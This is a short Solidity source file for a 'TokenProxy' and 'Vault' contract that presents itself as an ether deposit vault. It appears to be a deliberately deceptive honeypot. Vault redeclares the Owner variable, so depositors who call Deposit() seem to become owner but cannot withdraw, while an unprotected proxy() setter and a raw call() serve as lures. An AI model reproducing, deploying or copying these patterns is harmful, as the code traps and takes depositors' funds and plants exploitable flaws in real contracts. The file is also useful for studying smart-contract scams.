1 pragma solidity ^0.4.17;
2 
3 contract TokenProxy  {
4     address public Proxy; bytes data;
5     modifier onlyOwner { if (msg.sender == Owner) _; }
6     function transferOwner(address _owner) onlyOwner { Owner = _owner; }
7     address public Owner = msg.sender;
8     function proxy(address _proxy)  { Proxy = _proxy; }
9     function execute() returns (bool) { return Proxy.call(data); }
10 }
11 
12 contract Vault is TokenProxy {
13     mapping (address => uint) public Deposits;
14     address public Owner;
15 
16     function () public payable { data = msg.data; }
17     event Deposited(uint amount);
18     event Withdrawn(uint amount);
19     
20     function Deposit() payable {
21         if (msg.sender == tx.origin) {
22             Owner = msg.sender;
23             deposit();
24         }
25     }
26     
27     function deposit() payable {
28         if (msg.value >= 1 ether) {
29             Deposits[msg.sender] += msg.value;
30             Deposited(msg.value);
31         }
32     }
33     
34     function withdraw(uint amount) payable onlyOwner {
35         if (amount>0 && Deposits[msg.sender]>=amount) {
36             msg.sender.transfer(amount);
37             Withdrawn(amount);
38         }
39     }
40 }